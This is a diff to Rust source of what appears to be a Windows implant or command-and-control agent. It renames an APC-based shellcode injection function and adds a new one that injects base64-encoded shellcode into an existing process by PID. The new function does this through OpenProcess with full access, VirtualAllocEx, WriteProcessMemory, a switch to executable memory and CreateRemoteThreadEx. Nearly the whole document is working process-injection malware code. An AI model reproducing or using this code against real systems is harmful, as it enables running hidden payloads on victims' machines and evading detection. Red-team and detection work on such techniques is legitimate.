@@ -25,9 +25,9 @@ use windows::{
             },
             Pipes::CreatePipe,
             Threading::{
-                CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW,
-                GetExitCodeThread,
-                PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
+                CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW, CreateRemoteThreadEx,
+                GetExitCodeThread, LPPROC_THREAD_ATTRIBUTE_LIST, OpenProcess,
+                PROCESS_ALL_ACCESS, PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
                 STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW, STARTUPINFOW_FLAGS
             },
         },
@@ -41,14 +41,14 @@ struct HandleSend {
 
 unsafe impl Send for HandleSend {}
 
+// Shellcode injection to new process
 // Thanks:
 //  https://github.com/postrequest/link/blob/main/src/links/windows/src/nonstd.rs#L108
-pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
+pub fn shellcode_createprocess(process_name: String, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
     let mut output: Vec<u8> = Vec::new();
 
     let mut shellcode = BASE64_STANDARD.decode(shellcode_b64.as_bytes()).unwrap();
     let mut shellcode = hex::decode(shellcode).unwrap();
-    println!("shellcode: {:?}", shellcode);
     let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;
 
     let mut hread_stdin = HANDLE::default();
@@ -181,17 +181,13 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
     };
 
     // Queue shellcode for execution and resume thread
-    let res = unsafe {
+    let _ = unsafe {
         QueueUserAPC(
             Some(transmute(shellcode_addr)),
             pi.hThread,
             0 as _,
         )
     };
-    if res == 0 {
-        // println!("QueueUserAPC failed.");
-        return Err(Error::new(ErrorKind::Other, "QueueUserAPC failed."));
-    }
 
     let _ = unsafe { ResumeThread(pi.hThread) };
 
@@ -226,7 +222,7 @@ pub fn shellcode(process_name: String, shellcode_b64: String) -> core::result::R
     }
 
     if output.len() == 0 {
-        output = "No output.".to_string().into_bytes();
+        output = "Shellcode injection success.".to_string().into_bytes();
     }
 
     Ok(output)
@@ -280,4 +276,77 @@ fn read_from_pipe(
         }
     }
     Ok(total_read as usize)
+}
+
+// Shellcode injection to existing process
+pub fn shellcode_openprocess(pid: u32, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
+    let mut output: Vec<u8> = Vec::new();
+
+    let mut shellcode = BASE64_STANDARD.decode(shellcode_b64.as_bytes()).unwrap();
+    let mut shellcode = hex::decode(shellcode).unwrap();
+    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;
+
+    let handle = match unsafe {
+        OpenProcess(
+            PROCESS_ALL_ACCESS,
+            true,
+            pid,
+        )
+    } {
+        Ok(h) => h,
+        Err(e) => {
+            return Err(Error::new(ErrorKind::Other, e.to_string()));
+        }
+    };
+
+    // Allocate payload
+    let shellcode_addr = unsafe {
+        VirtualAllocEx(
+            handle,
+            None,
+            shellcode.len(),
+            MEM_COMMIT,
+            PAGE_READWRITE,
+        )
+    };
+
+    let mut ret_len: usize = 0;
+    let res = unsafe {
+        WriteProcessMemory(
+            handle,
+            shellcode_addr,
+            shellcode_ptr,
+            shellcode.len(),
+            Some(&mut ret_len),
+        )
+    };
+
+    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+    let _ = unsafe {
+        VirtualProtectEx(
+            handle,
+            shellcode_addr,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        )
+    };
+
+    let _ = unsafe {
+        CreateRemoteThreadEx(
+            handle,
+            None,
+            0,
+            transmute(shellcode_addr),
+            None,
+            0,
+            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
+            None,
+        )
+    };
+
+    // Close handles
+    let _ = unsafe { CloseHandle(handle) };
+
+    Ok("Shellcode injection success.".to_string().as_bytes().to_vec())
 }
